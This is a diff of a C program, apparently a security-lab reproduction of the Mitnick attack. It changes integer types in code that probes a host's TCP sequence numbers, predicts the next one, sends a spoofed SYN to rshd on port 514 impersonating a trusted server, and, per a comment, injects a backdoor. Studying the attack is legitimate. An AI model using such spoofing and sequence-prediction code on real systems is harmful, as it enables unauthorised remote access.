@@ -76,8 +76,8 @@ struct tcp_hdr {
 
 //function definitions
 uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
-int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, u_long ack);
-u_long compute_next_seq(u_long n1, u_long n2);
+int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint32_t my_seq, uint32_t ack);
+uint32_t compute_next_seq(uint32_t n1, uint32_t n2);
 
 //shimomura you're doomed
 int main (void)
@@ -181,7 +181,7 @@ int main (void)
 	}
 
 	//probe xterminal
-	u_long seq_array[3]; //actually I onlly need 2
+	uint32_t seq_array[3]; //actually I onlly need 2
 
 	printf("Starting probing\n");
 	for (i = 0; i < 3; i++)
@@ -199,7 +199,7 @@ int main (void)
 		tcp_seq ack = htonl(tcp_hdr->th_ack);
 		//usleep(1000);
 		printf("seq %u, ack %u\n", seq, ack);
-		seq_array[i] = seq;
+		seq_array[i] = (uint32_t) seq;
 
 	}
 
@@ -210,13 +210,13 @@ int main (void)
 	printf("predictions\n");
 	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]) -1);
 
-	u_long predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
+	uint32_t predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
 	printf("predicted next seq %lu\n", predicted_seq);
 	//exploit trust relation
 
 	//send syn impersonating the server
 	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
-	uint16_t my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
+	uint32_t my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
 	printf("sent spoofed syn with seq %u, waiting a second\n", my_seq);
 	sleep(1);
 	//send ack with predicted seq and inject backdoor
@@ -304,7 +304,7 @@ uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32
 }
 
 
-int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, u_long ack)
+int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint32_t my_seq, uint32_t ack)
 {
 
 	libnet_ptag_t t;
@@ -371,10 +371,10 @@ int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t p
 }
 
 
-u_long compute_next_seq(u_long n1, u_long n2)
+uint32_t compute_next_seq(uint32_t n1, uint32_t n2)
 {
 	//expression for next sequence number
 	//seq(N) = 2seq(N-1) - seq(N-2) + 3
-	u_long n = 2*n1 - n2 + 3 + 1;
+	uint32_t n = 2*n1 - n2 + 3 + 1;
 	return n;
 }
